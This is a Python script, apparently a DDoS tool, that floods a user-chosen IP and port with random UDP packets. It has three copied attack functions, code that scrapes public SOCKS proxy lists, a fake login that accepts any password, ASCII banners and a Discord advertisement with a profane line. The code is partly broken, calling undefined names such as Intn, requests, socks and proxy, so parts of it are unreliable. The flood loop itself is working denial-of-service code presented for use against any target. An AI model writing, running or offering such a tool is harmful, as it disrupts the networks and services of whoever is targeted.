import time
from time import time as tt
import argparse, socket, random, os
from sys import stdout
os.system("clear")

print("""\033[91m
Login
""")

username = str(input("\033[93mUsername:"))
password = str(input("\033[93mPassword:"))
if password == f"{password}" and username == f"{username}":
    print (f"Connect As {username}")
    time.sleep(2)

else:
    print (f"The password you entered is wrong Password You Input: {password}")
    exit()
#---------_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_>
proxyResources = [
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
    'https://www.proxy-list.download/api/v1/get?type=socks5',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
]
socksFile= "socks5.txt"
#GET SOCKS
def socksCrawler():
    global socksFile, socksResources
    f = open(socksFile,'wb')
    for url in proxyResources:
        try:
            f.write(requests.get(url).content)
        except:
            pass
    f.close()

proxyResources = [
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
    'https://www.proxy-list.download/api/v1/get?type=socks5',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
]
socksFile= "http.txt"
#GET SOCKS
def socksCrawler():
    global socksFile, socksResources
    f = open(socksFile,'wb')
    for url in proxyResources:
        try:
            f.write(requests.get(url).content)
        except:
            pass
    f.close()

def get_proxies():
    global proxies
    if not os.path.exists("./http.txt"):
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./http.txt )\n")
        return False
    proxies = open("./http.txt", 'r').read().split('\n')
    return True
#---------_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
os.system("clear")
print("""\033[91m
                       *   )  
             (      )` )  /(  
   _     _   )\  ( /( ( )(_)) 
 _| |_ _| |_((_) )\()|_(_())  
|_   _|_   _| __((_)\|_   _|  
  |_|   |_| | _|\ \ /  | |    
            |___/_\_\  |_|    

""")
print("@++ExT-ArapXyZ")
print("\033[95mIP HOST")
ip = str(input("╚══> "))
print("\033[95mPORT HOST")
port = int(input("╚══> "))
print("\033[95mPACKET INPUT")
time = int(input("╚══> "))
print("\033[95mTHREADS INPUT")
threads = int(input("╚══>"))

os.system("clear")

attacks = """
\033[91m
 ▄▄▄       ██▀███   ▄▄▄       ██▓███  ▒██   ██▒▓██   ██▓▒███████▒
▒████▄    ▓██ ▒ ██▒▒████▄    ▓██░  ██▒▒▒ █ █ ▒░ ▒██  ██▒▒ ▒ ▒ ▄▀░
▒██  ▀█▄  ▓██ ░▄█ ▒▒██  ▀█▄  ▓██░ ██▓▒░░  █   ░  ▒██ ██░░ ▒ ▄▀▒░ 
░██▄▄▄▄██ ▒██▀▀█▄  ░██▄▄▄▄██ ▒██▄█▓▒ ▒ ░ █ █ ▒   ░ ▐██▓░  ▄▀▒   ░
 ▓█   ▓██▒░██▓ ▒██▒ ▓█   ▓██▒▒██▒ ░  ░▒██▒ ▒██▒  ░ ██▒▓░▒███████▒
 ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▓▒░ ░  ░▒▒ ░ ░▓ ░   ██▒▒▒ ░▒▒ ▓░▒░▒
  ▒   ▒▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░░▒ ░     ░░   ░▒ ░ ▓██ ░▒░ ░░▒ ▒ ░ ▒
  ░   ▒     ░░   ░   ░   ▒   ░░        ░    ░   ▒ ▒ ░░  ░ ░ ░ ░ ░
      ░  ░   ░           ░  ░          ░    ░   ░ ░       ░ ░    
                                                ░ ░     ░        
          Join Discord ++ExT
            https://discord.gg/3YcsM2qQ
             You Mom Fuck Shit
"""

def attack(ip, port, time, threads):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
        print(attacks)
        print("\033[92m https://discord.gg/3YcsM2qQ")
        fmt = '\033[91m  ++ExT Sent Ip {ip}, {port}'.format(
        ip=ip,
        port='Port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    damage = random._urandom(int(Intn(1024, 60000)))
    sock.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1, 65535)
        endtime = tt()
        if startup + time < endtime:
            break
        sock.sendto(damage, (ip, port))

    print ('\x1b[92mAttack Finished')
    return

def attack2(ip, port, time, threads):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
        print(attacks)
        print("\033[92m https://discord.gg/3YcsM2qQ")
        fmt = '\033[91m  ++ExT Sent Ip {ip}, {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    damage = random._urandom(int(Intn(1024, 60000)))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1, 65535)
        endtime = tt()
        if startup + time < endtime:
            break
        sock.sendto(damage, (ip, port))

    print ('\x1b[92mAttack Finished')
    return

def attack3(ip, port, time, threads):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
        print(attacks)
        print("\033[92m https://discord.gg/3YcsM2qQ")
        fmt = '\033[91m  ++ExT Sent Ip {ip}, {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    damage = random._urandom(int(Intn(1024, 60000)))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1, 65535)
        endtime = tt()
        if startup + time < endtime:
            break
        sock.sendto(damage, (ip, port))

    print ('\x1b[92mAttack Finished')
    return

if __name__ == '__main__':
    try:
        attack(ip, port, time, threads)
        attack2(ip, port, time, threads)
        attack3(ip, port, time, threads)
    except KeyboardInterrupt:
        print ('Attack stopped.')
